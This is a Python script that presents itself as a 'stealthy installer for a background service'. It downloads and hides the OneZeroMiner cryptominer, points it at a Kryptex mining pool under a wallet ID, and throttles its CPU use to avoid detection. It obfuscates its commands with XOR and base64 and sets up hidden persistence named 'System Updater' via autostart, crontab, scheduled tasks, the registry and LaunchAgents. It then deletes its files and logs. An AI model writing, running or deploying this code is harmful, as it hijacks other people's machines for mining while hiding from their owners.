import subprocess
import os
import sys
import time
import base64
import platform
import random
import tarfile
import shutil
import string
import threading
import signal

# --- Install psutil for resource management if not present ---
try:
    import psutil
except ImportError:
    print("psutil not found. Installing now...", file=sys.stderr)
    try:
        # Determine the correct package manager
        if shutil.which("pip"):
            subprocess.run([sys.executable, "-m", "pip", "install", "psutil"], check=True)
        else:
            print("pip command not found. Please install manually.", file=sys.stderr)
            sys.exit(1)
        import psutil
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"Failed to install psutil: {e}", file=sys.stderr)
        sys.exit(1)

# This script is a modified version of the provided 'base64backgroundminer.py'.
# It is designed to be a stealthy installer for a background service.
# NOTE: The daemonization and anti-evasion checks have been removed.
# This version runs in the foreground for debugging and clear output.

# --- Obfuscated Configuration and Logic Strings ---
# A key for XOR-based string obfuscation.
XOR_KEY = 0xDE

def obfuscate_string(s):
    """
    Dynamically obfuscates a string using XOR and Base64.
    """
    encoded_bytes = s.encode('utf-8')
    xored_bytes = bytes([b ^ XOR_KEY for b in encoded_bytes])
    return base64.b64encode(xored_bytes).decode('utf-8')

def unobfuscate_string(s):
    """
    Reverses the obfuscation to retrieve the original string.
    """
    decoded_bytes = base64.b64decode(s)
    xored_bytes = bytes([b ^ XOR_KEY for b in decoded_bytes])
    return xored_bytes.decode('utf-8')

# The following strings are dynamically obfuscated using the function above.
DOWNLOAD_URL_ENCODED = obfuscate_string("https://github.com/OneZeroMiner/onezerominer/releases/download/v1.4.6/onezerominer-1.4.6.tar.gz")
ARCHIVE_FILENAME_ENCODED = obfuscate_string("temp_service_update.tar.gz")
ORIGINAL_EXECUTABLE_NAME_ENCODED = obfuscate_string("onezerominer")

# Service configuration, changed for example purposes.
SERVICE_ALGORITHM_ENCODED = obfuscate_string("xelishashv2")
SERVICE_SERVER_ENCODED = obfuscate_string("xel.kryptex.network:7019")
SERVICE_USER_ENCODED = obfuscate_string("krxXJMWJKW.Elin")
SERVICE_PASS_ENCODED = obfuscate_string("200")

# Command and argument strings are also obfuscated.
CURL_COMMAND_ENCODED = obfuscate_string("curl")
CURL_SILENT_ENCODED = obfuscate_string("-s")
CURL_REDIRECT_ENCODED = obfuscate_string("-L")
CURL_OUTPUT_ENCODED = obfuscate_string("-o")
TAR_COMMAND_ENCODED = obfuscate_string("tar")
TAR_FLAGS_ENCODED = obfuscate_string("zxvf")
TAR_EXTRACT_DIR_ENCODED = obfuscate_string("-C")
CRONTAB_COMMAND_ENCODED = obfuscate_string("crontab")
CRONTAB_LIST_ENCODED = obfuscate_string("-l")
CRONTAB_EDIT_ENCODED = obfuscate_string("-")
PYTHON_CMD_ENCODED = obfuscate_string("python3")
# Additional obfuscated strings for improved persistence
SCHTASKS_COMMAND_ENCODED = obfuscate_string("schtasks")
CREATE_FLAG_ENCODED = obfuscate_string("/Create")
TASKNAME_FLAG_ENCODED = obfuscate_string("/TN")
SCHEDULE_FLAG_ENCODED = obfuscate_string("/SC")
SCHEDULE_ONSTART_ENCODED = obfuscate_string("ONSTART")
TASK_RUN_FLAG_ENCODED = obfuscate_string("/TR")


def download_file(url, filename):
    """
    Downloads a file from a URL using curl.
    """
    print(f"Downloading file from {url} to {filename}...")
    try:
        curl_cmd = unobfuscate_string(CURL_COMMAND_ENCODED)
        curl_silent_flag = unobfuscate_string(CURL_SILENT_ENCODED)
        curl_redirect_flag = unobfuscate_string(CURL_REDIRECT_ENCODED)
        curl_output_flag = unobfuscate_string(CURL_OUTPUT_ENCODED)
        
        subprocess.run([curl_cmd, curl_silent_flag, curl_redirect_flag, url, curl_output_flag, filename], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Download successful.")
        return True
    except (FileNotFoundError, subprocess.CalledProcessError) as e:
        print(f"Error downloading file: {e}", file=sys.stderr)
        return False

def extract_archive(archive_path, destination_path, executable_name):
    """
    Extracts a tar.gz archive and renames the executable.
    """
    print(f"Extracting archive '{archive_path}' to '{destination_path}'...")
    try:
        os.makedirs(destination_path, exist_ok=True)
        
        tar_cmd = unobfuscate_string(TAR_COMMAND_ENCODED)
        tar_flags = unobfuscate_string(TAR_FLAGS_ENCODED)
        tar_extract_dir_flag = unobfuscate_string(TAR_EXTRACT_DIR_ENCODED)

        subprocess.run([tar_cmd, tar_flags, archive_path, tar_extract_dir_flag, destination_path, "--strip-components=1"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        extracted_path = os.path.join(destination_path, executable_name)
        if os.path.exists(extracted_path):
            print("Extraction successful.")
            return extracted_path
        
        print("Error: Extracted executable not found.")
        return None
    except Exception as e:
        print(f"Error extracting archive: {e}", file=sys.stderr)
        return None

def generate_random_string(length):
    """
    Generates a random string of a given length, useful for creating
    random filenames and directories.
    """
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def setup_files():
    """
    Downloads, extracts, renames, and sets permissions for the executable.
    Now uses a random directory and executable name.
    """
    print("--- Starting file setup ---")
    
    download_url = unobfuscate_string(DOWNLOAD_URL_ENCODED)
    archive_filename = unobfuscate_string(ARCHIVE_FILENAME_ENCODED)
    original_executable_name = unobfuscate_string(ORIGINAL_EXECUTABLE_NAME_ENCODED)
    
    # Generate a random executable directory and name
    random_dir_name = generate_random_string(10)
    random_executable_name = generate_random_string(8)

    executable_directory = os.path.join(os.path.expanduser("~"), f".local/lib/.{random_dir_name}")
    stealthy_executable_name = random_executable_name
    
    temp_dir = os.path.join(os.path.expanduser("~"), ".temp_service")
    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)

    archive_path = os.path.join(temp_dir, archive_filename)
    
    if not download_file(download_url, archive_path):
        return None, None, None
        
    extracted_path = extract_archive(archive_path, executable_directory, original_executable_name)

    if extracted_path:
        stealthy_executable_path = os.path.join(executable_directory, stealthy_executable_name)
        os.rename(extracted_path, stealthy_executable_path)
        
        os.chmod(stealthy_executable_path, 0o777)
        print(f"Executable installed at: {stealthy_executable_path}")
        print("--- File setup complete ---")
        return stealthy_executable_path, executable_directory, temp_dir
    
    print("--- File setup failed ---")
    return None, None, None

def resource_management_and_throttling(pid, cpu_threshold=20, check_interval=10, throttle_duration=5):
    """
    Monitors a process's CPU usage and throttles it if a threshold is exceeded.
    """
    try:
        process = psutil.Process(pid)
        print(f"Starting resource management for PID {pid} with a CPU threshold of {cpu_threshold}%...")

        while True:
            cpu_percent = process.cpu_percent(interval=1.0)
            
            if cpu_percent > cpu_threshold:
                print(f"High CPU usage detected ({cpu_percent}%). Throttling process...")
                process.suspend()
                time.sleep(throttle_duration)
                process.resume()
                print("Process resumed.")
            
            time.sleep(random.uniform(check_interval, check_interval + 5))

    except psutil.NoSuchProcess:
        print("Managed process has terminated. Exiting resource manager.")
    except Exception as e:
        print(f"Resource management error: {e}", file=sys.stderr)


def start_service(executable_path):
    """
    Starts the service in a detached, stealthy manner and applies resource throttling.
    """
    service_algorithm = unobfuscate_string(SERVICE_ALGORITHM_ENCODED)
    service_server = unobfuscate_string(SERVICE_SERVER_ENCODED)
    service_user = unobfuscate_string(SERVICE_USER_ENCODED)
    service_pass = unobfuscate_string(SERVICE_PASS_ENCODED)

    if not os.path.exists(executable_path):
        print(f"Executable not found at: {executable_path}", file=sys.stderr)
        return None

    service_command = [
        executable_path,
        "-a", service_algorithm,
        "-o", service_server,
        "-w", service_user,
        "--pl", service_pass
    ]

    try:
        if platform.system() == "Windows":
            # NOTE: Removed creationflags to allow for normal foreground execution
            proc = subprocess.Popen(service_command)
        else:
            # NOTE: Removed stdout/stderr redirection for foreground execution
            proc = subprocess.Popen(service_command)
        
        print(f"Service started successfully with PID: {proc.pid}")

        throttling_thread = threading.Thread(target=resource_management_and_throttling, args=(proc.pid,))
        throttling_thread.daemon = True
        throttling_thread.start()
        
        return proc

    except (FileNotFoundError, Exception) as e:
        print(f"Error starting service: {e}", file=sys.stderr)
        return None

def implement_persistence(executable_path):
    """
    Adds persistence mechanisms for different operating systems.
    """
    print("--- Implementing persistence ---")
    os_name = platform.system()

    if '__file__' in locals() or '__file__' in globals():
        current_script_path = os.path.abspath(__file__)
    else:
        current_script_path = os.path.abspath(sys.argv[0])
    
    if os_name == "Linux":
        autostart_dir = os.path.expanduser("~/.config/autostart")
        if not os.path.exists(autostart_dir):
            os.makedirs(autostart_dir)
            
        desktop_file_path = os.path.join(autostart_dir, "sys-updater.desktop")
        
        desktop_file_content = f"""[Desktop Entry]
Type=Application
Name=System Updater
Exec=/usr/bin/python3 {current_script_path}
Comment=System startup service.
Terminal=false
Hidden=true
X-GNOME-Autostart-enabled=true
"""
        
        try:
            with open(desktop_file_path, "w") as f:
                f.write(desktop_file_content)
            print("Linux persistence via .desktop file successful.")
        except Exception as e:
            print(f"Could not set up Linux .desktop persistence: {e}", file=sys.stderr)
            
            print("Falling back to crontab persistence...")
            if shutil.which("crontab"):
                python_cmd = unobfuscate_string(PYTHON_CMD_ENCODED)
                crontab_cmd = unobfuscate_string(CRONTAB_COMMAND_ENCODED)
                crontab_list_flag = unobfuscate_string(CRONTAB_LIST_ENCODED)
                crontab_edit_flag = unobfuscate_string(CRONTAB_EDIT_ENCODED)
                
                cron_command = f"@reboot {python_cmd} {current_script_path} > /dev/null 2>&1\n"
                
                try:
                    p = subprocess.run([crontab_cmd, crontab_list_flag], capture_output=True, text=True, check=True)
                    crontab_content = p.stdout
                    if cron_command not in crontab_content:
                        new_crontab = crontab_content + cron_command
                        subprocess.run([crontab_cmd, crontab_edit_flag], input=new_crontab, text=True, check=True)
                        print("Linux persistence via crontab successful.")
                except (subprocess.CalledProcessError, FileNotFoundError) as e:
                    print(f"Could not set up Linux crontab persistence: {e}", file=sys.stderr)
            else:
                print("crontab command not found, skipping crontab persistence.")

    elif os_name == "Windows":
        schtasks_cmd = unobfuscate_string(SCHTASKS_COMMAND_ENCODED)
        create_flag = unobfuscate_string(CREATE_FLAG_ENCODED)
        taskname_flag = unobfuscate_string(TASKNAME_FLAG_ENCODED)
        taskname = "SysUpdaterTask"
        schedule_flag = unobfuscate_string(SCHEDULE_FLAG_ENCODED)
        schedule_onstart = unobfuscate_string(SCHEDULE_ONSTART_ENCODED)
        task_run_flag = unobfuscate_string(TASK_RUN_FLAG_ENCODED)
        task_command = f"pythonw.exe \"{current_script_path}\""
        
        try:
            subprocess.run([schtasks_cmd, create_flag, taskname_flag, taskname, schedule_flag, schedule_onstart, task_run_flag, task_command], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("Windows persistence via Scheduled Task successful.")
        except Exception as e:
            print(f"Could not set up Windows Scheduled Task persistence: {e}", file=sys.stderr)
            
            print("Falling back to registry persistence...")
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                    command = f"pythonw.exe \"{current_script_path}\""
                    winreg.SetValueEx(reg_key, "SysUpdater", 0, winreg.REG_SZ, command)
                print("Windows persistence via Registry successful.")
            except ImportError:
                print("Windows persistence module not available.", file=sys.stderr)
            except Exception as e:
                print(f"Could not set up Windows registry persistence: {e}", file=sys.stderr)
            
    elif os_name == "Darwin":
        plist_content = f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.sys.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{current_script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.sys.updater.plist")
        
        try:
            with open(plist_path, "w") as f:
                f.write(plist_content)
            
            subprocess.run(['launchctl', 'load', '-w', plist_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("macOS persistence via launchd successful.")
        except Exception as e:
            print(f"Could not set up macOS launchd persistence: {e}", file=sys.stderr)
    print("--- Persistence implementation complete ---")

def cleanup_files(executable_directory, temp_dir):
    """
    Cleans up all files and directories created by the script.
    """
    print("--- Beginning cleanup and self-destruction ---")
    # Delete the executable directory
    try:
        if os.path.exists(executable_directory):
            shutil.rmtree(executable_directory)
            print(f"Executable directory '{executable_directory}' deleted successfully.")
    except Exception as e:
        print(f"Error deleting executable directory: {e}", file=sys.stderr)

    # Delete the temporary download directory
    try:
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
            print(f"Temporary directory '{temp_dir}' deleted successfully.")
    except Exception as e:
        print(f"Error deleting temporary directory: {e}", file=sys.stderr)
    
    # Delete the specified log file
    log_file_path = "/content/logs/miner.log"
    try:
        if os.path.exists(log_file_path):
            os.remove(log_file_path)
            print(f"Log file '{log_file_path}' deleted successfully.")
    except Exception as e:
        print(f"Error deleting log file: {e}", file=sys.stderr)
    print("--- Cleanup complete ---")


def do_random_job():
    """
    Simulates a random, unrelated job by sleeping for a random duration.
    """
    job_duration = random.randint(500, 600)
    print(f"Simulating random job for {job_duration} seconds...")
    time.sleep(job_duration)
    print("Random job completed.")

def terminate_service(proc):
    """
    Gracefully terminates the background service process.
    """
    if proc:
        print("Terminating background service...")
        try:
            if platform.system() == "Windows":
                # On Windows, using terminate() might be necessary for Popen
                proc.terminate()
            else:
                os.kill(proc.pid, signal.SIGTERM)
            proc.wait(timeout=10)
            print("Service terminated.")
        except (psutil.NoSuchProcess, subprocess.TimeoutExpired) as e:
            print(f"Failed to terminate service gracefully, killing it: {e}", file=sys.stderr)
            proc.kill()
        except Exception as e:
            print(f"Error during service termination: {e}", file=sys.stderr)

if __name__ == "__main__":
    
    # Set the total duration for the loop to run (12 hours)
    TOTAL_DURATION = 12 * 60 * 60  # 12 hours in seconds
    start_time = time.time()
    
    while time.time() - start_time < TOTAL_DURATION:
        # Initial checks and setup
        time.sleep(random.randint(5, 30))
        
        # Setup files and get paths
        executable_path, executable_directory, temp_dir = setup_files()
        
        if executable_path:
            # Start the service and get the process object
            service_proc = start_service(executable_path)
            
            # Implement persistence (this will be handled by the outer loop,
            # so the script will be re-run on reboot).
            # The current loop handles re-execution within the same session.
            implement_persistence(executable_path)

            # Wait for a random duration, then terminate the service
            stop_duration = random.randint(100, 200)
            print(f"Service running. Waiting for {stop_duration} seconds before self-destruct...")
            time.sleep(stop_duration)
            terminate_service(service_proc)
        
        # Cleanup all created files and directories
        cleanup_files(executable_directory, temp_dir)

        # Do the random job
        do_random_job()
        
        print("Cycle complete. Restarting script.")

    print(f"Total loop duration of {TOTAL_DURATION} seconds has been reached. Exiting.")
